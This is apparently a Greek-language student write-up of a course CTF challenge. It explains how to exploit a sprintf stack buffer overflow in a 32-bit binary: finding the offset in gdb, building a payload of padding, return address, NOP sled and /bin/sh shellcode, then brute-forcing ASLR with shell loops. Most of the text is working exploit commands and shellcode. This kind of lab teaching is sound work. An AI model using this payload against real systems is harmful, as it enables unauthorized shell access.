
## Writeup για το Mission Impossible 1:

Χρήστος Κοντοχρήστος 1115202000090 (sdi2000090)
(1140 πόντους στον διαγωνισμό)

1. Αρχικά, έκανα copy το binary αρχείο welcome σε local μηχάνημα, χρησιμοποιώντας scp, για να μπορέσω να το κάνω inspect χρησιμοποιώντας έναν disassembler/decompiler, ώστε να μπορέσω να διβάσω τον κώδικα και να καταλάβω τι περίπου κάνει για να μπορέσω να τον κάνω exploit.

2. Αφού μεταφέρουμε το binary αρχείο welcome σε τοπικό μηχάνημα το ανοίγουμε με τον Ghidra decompiler, παρατηρούμε τις συναρτήσεις main() και vuln(). Παρατηρούμε οτι η συνάρτηση main, δέχεται μία παράμετρο ως command line argument, και στη συνέχεια καλέι τη συνάρτηση vuln(), στην οποία περνάει την παράμετρο ως string. Η συνάρτηση vuln, περνάει κατευθίαν το string στη συνάρτηση sprintf(), επειδή ο buffer έχει fixec μέγεθος (275 bytes) και δεν γίνεται κάποιος έλεγχος ορίων αυτό σημάινει οτι μπορεί να επιτευχθεί buffer overflow σε εκείνο το σημείο.

3. Άρα το exploitation plan είναι ένα κλασικό buffer overflow attack. Δηλαδή:

- Padding: γεμίζουμε τον buffer με junk data μέχρι να κάνουμε overwrite το return address
To πόσα bytes από junk data θα βάλουμε είναι το offset μας και θα το βρούμε στη συνέχεια.

- Βρίκουμε το return address του sp, που έχει γίνει overwritten και το προσθέτουμε μερικά έξτρα
bytes.

- Βαζουμε ένα μεγάλο nop sled, δηλαδή προθέτουμε αρκετά bytes από no-operation instructions
ώστε να μπορέσει προσεγγιστικά να πέσει κάπου μέσα στο nop sled και να οδηγηθεί στο shell code.

- Shell code injection: Κάνουμε inject το shell code σε bytes, το οποίο εκτελεί το /bin/sh
και πέρνουμε shell access.


Exploitation Plan:
ΑΦού συνδεθούμε στον server στο συγκεκριμένο port αρχικά προσπαθούμε να κάνουμε το πρόγραμμα να κρασάρει
γεμίζοντας τον buffer με junk data, αρχικά 275 όσο είναι δηλαδή το μέγεθος του buffer:

```
./welcome "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 275)')"
```
Αφού καταφέραμε να κάνουμε το πρόγραμμα να κρασάρει (segmentation fault) στημ συνέχεια ανοίγουμε τον gdb 
για να βρούμε το offset των bytes (junk data) που πρέπει να δώσουμε ως input στο πρόγραμμα μέχρι να κάνουμε 
overwrite το return address. Αξίζει εδώ να σημειωθεί οτι κάθε φορά που συνδεόμαστε στον server για το συγκεκριμένο
πρόβλημα CTF το offset αυτό αλλάζει, δηλαδή κάθε φορά ο αριθμός των bytes που πρέπει να εισάγουμε μέχρι να κάνουμε overwrite το return address είναι διαφορετικός.

Αρχικά κάνουμε: 

``` 
gdb ./welcome 
```

και στη συνέχεια:

``` 
(gdb) run $(python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 275)')
```
Και προσθέτουμε junk bytes μέχρι να κάνουμε overwrite το return address.
(Να σημειωθεί οτί υπάρχει πιο εύκολος και λιγότερο χρονοβόρος τρόπος να βρεθεί η τιμή του offest
που γίνεται overwritten το return address αλλά εγώ το έκανα με δοκιμές.)

Για να καταλάβουμε πότε έχουμε κάνει overwrite το return address κάνουμε το εξής:

```
(gdb) info registers
```
και κοιτάμε τον eip register, αν είναι 0x41414141 δηλαδή "ΑΑΑΑ" σημαίνει οτι έχουμε κάνει overwrite το return address.

Στην συνέχεια με την παραπάνω εντολή κοιτάμε τον esp register (stack pointer) και παίρνουμε την τιμή του (π.χ. 0xffb4c0c0).
Θα χρησιμοποιήσουμε αυτή την τιμή για να κάνουμε inject το shellcode.

# Building the Payload:

To payload αποτελείται από τα εξής: padding + return address + nop sled + shell code.
Για να χτίσουμε το payload, αρχικά βάζουμε όσα junk bytes βρήκαμε οτι έιναι το offset (π.χ b"A" * 300) και στη συνέχεια θα χρειαστούμε τη διεύθυνση που βρήκαμε πιο πάνω, βάζουμε τη διεύθυνση σε little endian αναπαράσταση χρησιμοποιώντας:
```struct.pack("<I", addr + 5000)```. Της προσθέτουμε μερικά έξτρα bytes για να είναι πιο πιθανό να πέσει πάνω στο nop sled και να οδηγηθεί στο shell code (συνήθως το μισό του nop sled). Στη συνέχεια βάζουμε το nop sled δηλαδή προσθέτουμε στο payload ένα μεγάλο αριθμό από b"\x90" bytes (\x90 είναι το no operation instruction) ώστε να μπορέσει να πέσει πάνω σε αυτό και να οδηγηθεί στο shell code (όσο πιο μεγάλο τόσο αυξάνονται οι πιθανότητες να πέσει πάνω σε αυτό). Και τέλος προσθέτουμε το shell code (μας δίνεται έτοιμο από τα hints). Με αυτόν τον τρόπο κάναμε overwrite το return address, έτσι μπορούμε να κάνουμε inject κώδικα, και βάλαμε ένα shellcode που εκτελεί το /bin/sh ώστε να πάρουμε root shell access. Τελικό payload:

```
./welcome "$(python3 -c 'import sys,struct; payload = b"B"*offset + struct.pack("<I", addr + 5000) + b"\x90"*10000 + b"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"; sys.stdout.buffer.write(payload)')"
```
οπού addr είναι η το return address που βρήκαμε και offset το offset που βρήκαμε μέχρι να γίνει overwritten το return address.

# ASLR Bypass (Brute Force):

Το binary αρχείο όμως διαθέτει ASLR και PIE, κάτι που σημαίνει οτι το παραπάνω payload μάλλον δεν θα δουλέψει σωστά επειδή 
η διεύθυνση κάθε φορά που εκτελείται το πρόγραμμα θα είναι διαφορετική. Δηλαδή το ASLR κάνει randomize τις διευθύνσεις του stack. Αυτό μπορούμε να το κάνουμε bypass με έναν brute force τρόπο. Δηλαδή να τρέξουμε το πρόγραμμα αρκετές φορές με την ίδια διεύθυνση μέχρι κάποια στιγμή να ξαναπέσει στην ίδια και να πετύχει το exploit. Ένας άλλος τρόπος έιναι να δοκιμάσουμε πολλές διευθύνσεις σε ένα while loop μέχρι να πετυχει τη σωστή διεύθυνση. Οπότε απλά φτιάχνουμε ένα script το οποίο τρέχει πολλές φορές το παραπάνω payload μέχρι να πετύχει το exploit.

Για να ελέγξουμε αν το binary έχει PIE ή ASLR κάνουμε:
```
checksec --file=./welcome
```

Μερικά scripts που δοκίμασα και πέτυχαν:

```
for i in $(seq 0 50); do
  addr=$((<the address you found>))
  ./welcome "$(python3 -c 'import sys,struct; addr = '"$addr"'; payload = b"B"*<the offset you found> + struct.pack("<I", addr + 5000) + b"\x90"*10000 + b"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"; sys.stdout.buffer.write(payload)')"
done
```

```
for i in $(seq 0 1000); do
  addr=$((<the address you found> + i * 4))
  ./welcome "$(python3 -c 'import sys,struct; addr = '"$addr"'; payload = b"B"*<the offset you found> + struct.pack("<I", addr + 5000) + b"\x90"*10000 + b"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"; sys.stdout.buffer.write(payload)')"
done
```


